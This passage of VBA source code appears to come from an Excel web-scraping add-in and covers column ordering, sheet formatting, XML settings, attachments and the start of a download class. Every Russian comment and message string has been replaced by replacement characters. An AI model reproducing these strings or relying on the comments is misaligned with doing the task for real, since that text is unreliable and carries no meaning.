        Set Me.Actions = New ArrayActions
        Set Me.Actions.ParentParser = Me.Parent
        Me.Actions.LoadFromXML node.SelectSingleNode("Actions")
        
        Dim subnode As IXMLDOMElement, OC As OutputColumn
        Set Me.Items = New Collection
        
        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set OC = New OutputColumn
            Set OC.Parent = Me
            OC.LoadFromXML subnode
            Me.Items.Add OC
        Next
    End If
End Sub

Sub CalculateColumnOrder(Optional ByVal ForceReorder As Boolean)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Not (Me.AutoOrder Or ForceReorder) Then Exit Sub
    On Error Resume Next
    Dim OC As OutputColumn, i&, col&, BusyColumns As New Dictionary
    Dim NextFreeColumn&, NextFreeMultiColumn&
    
    NextFreeColumn& = Me.AutoOrder_FirstColumn
    NextFreeMultiColumn& = Me.AutoOrder_FirstColumn
    
    For Each OC In Me.Items
        With OC
            If (.Enabled And .OutputEnabled) Or (Not Me.AutoOrder) Then
                ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                
                .Column = NextFreeColumn&
                Select Case True
                    Case .MulticolumnEnabled ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        .Column = NextFreeMultiColumn&
                        
                        For i& = 1 To .MulticolumnHeadersCount
                            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            col& = .Column + (i - 1) * .MulticolumnStep
                            BusyColumns.Add col&, ""
                        Next i
                        
                        If .MulticolumnStep = 1 Then
                            NextFreeMultiColumn& = .Column + .MulticolumnHeadersCount
                        Else
                            NextFreeMultiColumn& = .Column + 1
                        End If
                        
                        While BusyColumns.Exists(NextFreeMultiColumn&)
                            NextFreeMultiColumn& = NextFreeMultiColumn& + 1
                        Wend
                        
                        NextFreeColumn& = .Column + (.MulticolumnHeadersCount - 1) * .MulticolumnStep + 1
                        
                    Case .DynamicColumns ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        NextFreeColumn& = .Column + 20
                        NextFreeMultiColumn& = .Column + 20
                        
                    Case Else ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        NextFreeColumn& = .Column + 1
                        NextFreeMultiColumn& = .Column + 1
                        
                End Select
            Else
                .Column = 0
            End If
            
        End With
    Next OC
    Set BusyColumns = Nothing
End Sub

Attribute VB_Name = "OutputSheetOptions"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : OutputSheetOptions
' Author        : Igor Vakhnenko            Date: 21.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "SheetOptions"
Public Parent As OutputColumns

Public HeaderRowNumber As Long
Public BaseColumn As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public ClearSheetOnStart As Boolean
Public CreateNewWorkbook As Boolean
Public OutputColumnsNames As Boolean
Public FormatColumns As Boolean
Public ScrollWorksheet As Boolean
Public Zoom As Long

Public ScreenUpdatingInterval As Long
Public FastOutput As Boolean

Private Sub Class_Initialize()
    Me.HeaderRowNumber = 1
    Me.BaseColumn = 1
    Me.ScreenUpdatingInterval = 1
    Me.ScrollWorksheet = True
    Me.Zoom = 100
    Me.FormatColumns = True
End Sub

Private Sub Class_Terminate()
    Set Me.Parent = Nothing
End Sub

Sub PrepareSheet(Optional ByVal ForceOutput As Boolean = False, Optional SheetOnStart As Boolean = False)
    On Error Resume Next
    Dim sh As Worksheet, OC As OutputColumn, SU As Boolean, awsr As Long, awsc As Long, awCell As Range, _
        PrepareSheetDescriptionText$, col, cols_array, col_index&, suff$, vsuff&
    Set sh = Me.Parent.Parent.Sheet

    If Me.Parent.Parent.SourceData.Mode = ps_FoundColumn Then Exit Sub        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    Me.Parent.Parent.PrInd1.ShowMessage tt("PI_ShowMessage_PreparingTable") & " ..."

    If Me.ClearSheetOnStart And Not ForceOutput Then
        Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."
        Intersect(sh.UsedRange, sh.Range((Me.HeaderRowNumber + 1) & ":" & sh.Rows.Count)).ClearContents

        PrepareSheetDescriptionText$ = PrepareSheetDescriptionText$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & "<br />"
    End If

    With Me.Parent
        If .Enabled Or ForceOutput Then
            sh.Parent.Activate
            sh.Activate
            If (Me.Zoom > 0) And (Me.Zoom <> 100) Then ActiveWindow.Zoom = Me.Zoom

            If Me.OutputColumnsNames Or ForceOutput Then
                SU = Application.ScreenUpdating: Application.ScreenUpdating = True
                ActiveWindow.FreezePanes = False
                awsr = ActiveWindow.ScrollRow: awsc = ActiveWindow.ScrollColumn
                ActiveWindow.ScrollRow = 1
                Set awCell = ActiveCell
                Cells(Me.HeaderRowNumber + 1, 1).Select
                DoEvents
                ActiveWindow.FreezePanes = True
                ActiveWindow.ScrollRow = awsr
                ActiveWindow.ScrollColumn = awsc
                awCell.Select
                Application.ScreenUpdating = SU

                Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & Me.HeaderRowNumber
                PrepareSheetDescriptionText$ = PrepareSheetDescriptionText$ & _
                                               "<br />|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & Me.HeaderRowNumber & "" & "<br /><br />"
                Application.ScreenUpdating = False
            Else
                Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            End If

            For Each OC In .Items
                If StopMacro Then Exit For
                If (OC.Enabled And OC.OutputEnabled) Then
                    suff$ = ""
                    'If OC.MulticolumnEnabled And OC.MulticolumnHeadersEnabled And (OC.MulticolumnHeadersCount > 1) Then
                    If OC.MulticolumnEnabled And (OC.MulticolumnHeadersCount > 1) Then
                        If OC.MulticolumnHeadersSuffixEnabled Then suff$ = OC.MulticolumnHeadersSuffixValue
                        cols_array = "": ReDim cols_array(1 To OC.MulticolumnHeadersCount)
                        For col_index& = 1 To OC.MulticolumnHeadersCount
                            cols_array(col_index&) = OC.Column + (col_index& - 1) * OC.MulticolumnStep
                        Next col_index&
                    Else
                        cols_array = Array(OC.Column)
                    End If

                    col_index& = 0
                    For Each col In cols_array
                        DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col
                        col_index& = col_index& + 1
                        If Val(col) <= .Parent.Sheet.Columns.Count Then
                            With .Parent.Sheet.Cells(Me.HeaderRowNumber, Val(col))
                                ' Dim TimeStamp As Double, TimeStamp2 As Double, ProcessTime$
                                ' Debug.Print "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & ": ",: TimeStamp = Timer: TimeStamp2 = Timer

                                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                If (Me.OutputColumnsNames Or Not SheetOnStart) Then
                                    With .EntireColumn
                                        DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                                        .Hidden = OC.Format.ColumnWidth = 0
                                        If (OC.Format.ColumnWidth <> DEFAULT_COLUMN_WIDTH) Then        'And (.ColumnWidth = .Parent.StandardWidth) Then
                                            If OC.Format.ColumnWidth > 0 Then .ColumnWidth = OC.Format.ColumnWidth        ': Debug.Print "ColumnWidth: " & Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|." & ";  ";: TimeStamp = Timer
                                        End If

                                    End With
                                End If

                                If Me.FormatColumns And (Me.OutputColumnsNames Or Not SheetOnStart) Then
                                    With .EntireColumn
                                        
                                        DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
                                        .WrapText = OC.Format.WrapText
                                        'Debug.Print "WrapText: " & Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|." & ";  ";: TimeStamp = Timer

                                        DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
                                        .VerticalAlignment = xlVAlignCenter
                                        'Debug.Print "VerticalAlignment: " & Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|." & ";  ";: TimeStamp = Timer

                                        DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
                                        If OC.Format.HorizontalAlignment > 0 Then
                                            .HorizontalAlignment = CHOOSE(OC.Format.HorizontalAlignment, xlHAlignLeft, xlHAlignCenter, xlHAlignRight)
                                            'debug.Print "HorizontalAlignment: " & Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|." & ";  ";: TimeStamp = Timer
                                        End If
                                    End With
                                End If
                                'ProcessTime$ = Format(Timer - TimeStamp2, "0.00") & " |fffd||fffd||fffd|."
                                'Debug.Print "|fffd||fffd||fffd||fffd||fffd|: " & ProcessTime$


                                Me.Parent.Parent.PrInd1.ShowMessage ""

                                If Me.OutputColumnsNames Or ForceOutput Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                    DoEvents: Me.Parent.Parent.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & col & "  - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

                                    If OC.Name = "" And OC.DynamicColumns Then
                                        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                                    Else
                                        If Len(suff$) Then
                                            vsuff& = Val(suff$) + col_index& - 1
                                            If vsuff& = 0 Then .value = Render(OC.Name) Else .value = Render(OC.Name) & " " & vsuff&
                                        Else
                                            .value = Render(OC.Name)
                                        End If
                                    End If
                                    ' Debug.Print OC.Name, .value

                                    ' If Me.FormatColumns Then
                                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - 31 |fffd||fffd||fffd||fffd||fffd| 2019
                                    .HorizontalAlignment = xlHAlignCenter: .VerticalAlignment = xlVAlignCenter
                                    .WrapText = True
                                    
                                    If Len(OC.Name) Then .Interior.Color = OC.Format.HeaderColor
                                    .Font.Bold = True: .Borders.LineStyle = xlContinuous
                                    ' End If

                                    If col_index& = 1 Then PrepareSheetDescriptionText$ = PrepareSheetDescriptionText$ & _
                                       "> |fffd||fffd||fffd||fffd||fffd||fffd||fffd| <strong>" & ColumnNameByColumnNumber(Val(col)) & "  (" & OC.Name & ")</strong><br />"
                                    Me.Parent.Parent.PrInd1.ShowMessage ""
                                End If
                            End With
                        End If
                    Next col
                End If
            Next OC
        End If
    End With

    If DESCRIPTION_MODE And (PrepareSheetDescriptionText$ <> "") Then
        HDF.PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "parser-prepare-sheet"
        DescriptionText = DescriptionText & PrepareSheetDescriptionText$
        HDF.PublishHTML_CloseTable
    End If
    Me.Parent.Parent.PrInd1.HideMessages
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            If Me.FastOutput Then .Attributes.setNamedItem(XML.createAttribute("FastOutput")).text = Abs(CInt(Me.FastOutput))

            .Attributes.setNamedItem(XML.createAttribute("ScreenUpdatingInterval")).text = Me.ScreenUpdatingInterval
            .Attributes.setNamedItem(XML.createAttribute("HeaderRowNumber")).text = Me.HeaderRowNumber
            .Attributes.setNamedItem(XML.createAttribute("BaseColumn")).text = Me.BaseColumn
            If Me.ClearSheetOnStart Then .Attributes.setNamedItem(XML.createAttribute("ClearSheetOnStart")).text = Abs(CInt(Me.ClearSheetOnStart))
            If Me.CreateNewWorkbook Then .Attributes.setNamedItem(XML.createAttribute("CreateNewWorkbook")).text = Abs(CInt(Me.CreateNewWorkbook))
            If Me.OutputColumnsNames Then .Attributes.setNamedItem(XML.createAttribute("OutputColumnsNames")).text = Abs(CInt(Me.OutputColumnsNames))
            .Attributes.setNamedItem(XML.createAttribute("ScrollWorksheet")).text = Abs(CInt(Me.ScrollWorksheet))
            .Attributes.setNamedItem(XML.createAttribute("FormatColumns")).text = Abs(CInt(Me.FormatColumns))
            .Attributes.setNamedItem(XML.createAttribute("Zoom")).text = Me.Zoom
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        Me.FastOutput = CBool(Val(.Attributes.getNamedItem("FastOutput").text))

        Me.ScreenUpdatingInterval = Val(.Attributes.getNamedItem("ScreenUpdatingInterval").text)
        Me.HeaderRowNumber = Val(.Attributes.getNamedItem("HeaderRowNumber").text)
        Me.BaseColumn = Val(.Attributes.getNamedItem("BaseColumn").text)
        Me.ClearSheetOnStart = CBool(Val(.Attributes.getNamedItem("ClearSheetOnStart").text))
        Me.CreateNewWorkbook = CBool(Val(.Attributes.getNamedItem("CreateNewWorkbook").text))
        Me.OutputColumnsNames = CBool(Val(.Attributes.getNamedItem("OutputColumnsNames").text))
        Me.FormatColumns = CBool(Val(.Attributes.getNamedItem("FormatColumns").text))
        Me.ScrollWorksheet = CBool(Val(.Attributes.getNamedItem("ScrollWorksheet").text))
        Me.Zoom = Val(.Attributes.getNamedItem("Zoom").text)
    End With
    If Me.HeaderRowNumber <= 0 Then Me.HeaderRowNumber = 1
    'If Me.BaseColumn <= 0 Then Me.BaseColumn = 1
    If Me.ScreenUpdatingInterval <= 0 Then Me.ScreenUpdatingInterval = 1
End Sub

Attribute VB_Name = "ParserAttachment"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko            Date: 06.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "File"
Public Parent As ParserAttachments

Public Name As String
Public Index As Long
Public Content As String

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Sub Execute(Optional ByRef txt$)
    On Error Resume Next
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            .Attributes.setNamedItem(XML.createAttribute("Size")).text = Len(Me.Content) / 2

            .text = Me.Content
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Name = .Attributes.getNamedItem("Name").text

        Me.Content = .text
    End With
End Sub

Attribute VB_Name = "ParserAttachments"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserAttachments
' Author        : EducatedFool                     Date: 08.02.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Attachments", XML_SUBNODE_NAME$ = "File"
Public Parent As WebsiteParser

Public Items As New Collection

Private Sub Class_Terminate()
  Set Parent = Nothing
  Set Items = Nothing
End Sub

Function GetItemByName(ByVal AttachName$) As ParserAttachment
    On Error Resume Next:    Dim Attachment As ParserAttachment
    For Each Attachment In Me.Items
        If Attachment.Name = AttachName$ Then Set GetItemByName = Attachment: Exit Function
    Next Attachment
End Function

Function GetItemByIndex(ByVal Index&) As ParserAttachment
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function

Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Add() As ParserAttachment
    On Error Resume Next
    Set Add = New ParserAttachment
    With Add
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add Add
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Me.Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1)
    For i = 1 To Items.Count
        arr(i - 1) = Items(i).Name
    Next i
    ArrayOfNames = arr
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To 1)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .Index
            arr(n, 1) = .Name
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, Attachment As ParserAttachment
    Set XML = CreateObject("Microsoft.XMLDOM")

    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        'node.Attributes.setNamedItem(.createAttribute("Enabled")).Text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1

        For Each Attachment In Me.Items
            node.appendChild Attachment.ExportToXML
        Next Attachment
    End With

    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If

        Dim subnode As IXMLDOMElement, Attachment As ParserAttachment
        Set Me.Items = New Collection

        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set Attachment = New ParserAttachment
            Set Attachment.Parent = Me
            Attachment.LoadFromXML subnode
            Set Attachment.Parent = Me
            Me.Items.Add Attachment
        Next
    End If
End Sub
Attribute VB_Name = "ParserDownload"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserDownload
' Author        : Igor Vakhnenko            Date: 12.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Download"
Public Parent As ParserDownloads
Public Enabled As Boolean

Public Actions As New ArrayActions
Public Index As Long
Public Name As String

Public Enum DOWNLOAD_FILENAME_MODES
    dfm_Auto = 0
    dfm_UseMask = 1
End Enum

Public FilenameMode As DOWNLOAD_FILENAME_MODES
Public FilenameMask As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, "image_{2}.jpg"
Public Folder As String

Public OpenFolderOnFinish As Boolean
Public IgnoreErrors As Boolean

Public NeedAuth As Boolean
Public BasicAuthEnabled As Boolean, BasicAuthLogin As String, BasicAuthPassword As String        ' SetCredentials
Public POST_Enabled As Boolean, POST_Data As String
Public ResponseHeader_OK As String, ResponseHeader_ERROR As String

Public nOK As Long, nERR As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Initialize()
    Me.Enabled = True
    Me.IgnoreErrors = False    ' True ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 15.12.2017
    Me.Folder = ROOT_FOLDER_PREFIX$ & "\Downloads\{ParserName}\"
End Sub

Private Sub Class_Terminate()
    Set Actions = Nothing
    Set Parent = Nothing
End Sub

Sub Execute(ByVal txt$, Optional ForceRun As Boolean = False)
    On Error Resume Next
    Dim DownloadURL$, FileName$, arr, i, NewFolderPath$, res As Boolean, oStream As Object, RenderedFilename$, PostData$, Timeout&
    Dim RetryCount&, ProxyAttemptsCount&, ProxyAddressBefore$, ProxyAddressAfter$, ResponseText$, v
    If Not ForceRun Then If Not Me.Enabled Then Exit Sub
    Timeout& = Me.Parent.Parent.Options.RequestTimeout
    If Timeout& < 1 Then Timeout& = 1

    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_StartNewTable _
